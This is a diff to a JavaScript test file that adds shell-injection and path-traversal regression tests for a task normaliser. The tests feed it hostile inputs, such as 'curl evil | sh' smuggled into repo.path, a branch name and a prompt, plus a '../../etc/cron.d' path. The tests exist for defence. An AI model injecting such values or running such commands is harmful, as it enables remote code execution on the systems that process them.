@@ -143,10 +143,13 @@ test("generates PR-producing default commands for github-propose-patch mode with
   // Must generate commands (not use explicit ones).
   assert.ok(task.commands.length > 0, "Expected default commands");
 
-  // Step 1: prompt artifact writing.
+  // Step 1: prompt artifact writing. The prompt is delivered base64-encoded
+  // (decoded in-container) so it cannot break out of the surrounding shell.
   const writeCmd = task.commands[0] ?? "";
-  assert.ok(writeCmd.includes("/work/artifacts/prompt.md"), "Expected prompt artifact write");
-  assert.ok(writeCmd.includes("Fix the broken test."), "Expected prompt content in command");
+  assert.ok(writeCmd.includes("base64 -d > /work/artifacts/prompt.md"), "Expected base64 decode to prompt artifact");
+  const promptB64 = Buffer.from("Fix the broken test.", "utf8").toString("base64");
+  assert.ok(writeCmd.includes(promptB64), "Expected base64-encoded prompt content in command");
+  assert.ok(!writeCmd.includes("Fix the broken test."), "Prompt must not appear unencoded in the shell command");
   assert.ok(writeCmd.includes("patch_mode=github-propose-patch"), "Expected patch mode marker");
 
   // Step 2: PR-producing pipeline.
@@ -459,6 +462,72 @@ test("PR body heredoc uses quoted delimiter to prevent shell expansion", () => {
 
   const pipeline = task.commands[1] ?? "";
   assert.ok(pipeline.includes("<<'A2A_PR_BODY_EOF'"), "PR body heredoc must use single-quoted delimiter to suppress shell expansion");
+});
+
+// ---------------------------------------------------------------------------
+// Shell injection regression tests (a2a-nexus#574 items 2-4)
+// ---------------------------------------------------------------------------
+
+test("repo.path with shell metacharacters cannot inject into generated shell", () => {
+  const task = normalizeTask({
+    id: "repo-path-injection",
+    intent: "run",
+    repos: [{ url: "jinwon-int/test-repo", path: "repo; curl evil | sh", primary: true }],
+  });
+
+  const allCommands = task.commands.join("\n");
+  // The malicious payload must not survive into any generated command.
+  assert.ok(!allCommands.includes("curl evil"), "Shell metacharacters in repo.path must be neutralized");
+  assert.ok(!/[;|`$]/.test(task.repos[0]?.path ?? ""), "Normalized repo.path must contain no shell-active characters");
+});
+
+test("repo.path cannot traverse out of the work directory", () => {
+  const task = normalizeTask({
+    id: "repo-path-traversal",
+    intent: "run",
+    repos: [{ url: "jinwon-int/test-repo", path: "../../etc/cron.d", primary: true }],
+  });
+
+  const normalizedPath = task.repos[0]?.path ?? "";
+  assert.ok(!normalizedPath.includes(".."), "Parent-directory traversal must be stripped from repo.path");
+});
+
+test("baseBranch with command substitution cannot inject into PR/diff shell", () => {
+  const task = normalizeTask({
+    id: "base-branch-injection",
+    intent: "propose_patch",
+    mode: "github-propose-patch",
+    repo: "jinwon-int/test-repo",
+    baseBranch: 'main";$(curl evil|sh)"',
+    prompt: "patch",
+  });
+
+  const pipeline = task.commands[1] ?? "";
+  assert.ok(!pipeline.includes("curl evil"), "Shell-active characters in baseBranch must be neutralized");
+  assert.ok(!pipeline.includes("$(curl"), "Command substitution in baseBranch must not survive");
+  // The sanitized branch keeps git-legal characters.
+  assert.ok(pipeline.includes('--base "main"'), "Sanitized baseBranch should retain the legal portion");
+});
+
+test("task.prompt cannot break out of the prompt artifact write", () => {
+  // A prompt whose line equals the old heredoc delimiter, plus an injected
+  // command, must not escape into executable shell.
+  const malicious = "harmless line\nA2A_PROMPT_EOF\ncurl evil | sh\n";
+  const task = normalizeTask({
+    id: "prompt-heredoc-escape",
+    intent: "propose_patch",
+    mode: "github-propose-patch",
+    repo: "jinwon-int/test-repo",
+    baseBranch: "main",
+    prompt: malicious,
+  });
+
+  const writeCmd = task.commands[0] ?? "";
+  assert.ok(!writeCmd.includes("A2A_PROMPT_EOF"), "Prompt delivery must not use a heredoc delimiter the prompt can match");
+  assert.ok(!writeCmd.includes("curl evil"), "Injected command in prompt must not appear as raw shell");
+  // The full prompt is preserved, base64-encoded.
+  const encoded = Buffer.from(malicious, "utf8").toString("base64");
+  assert.ok(writeCmd.includes(encoded), "Prompt must be preserved as a base64 payload");
 });
 
 // ---------------------------------------------------------------------------
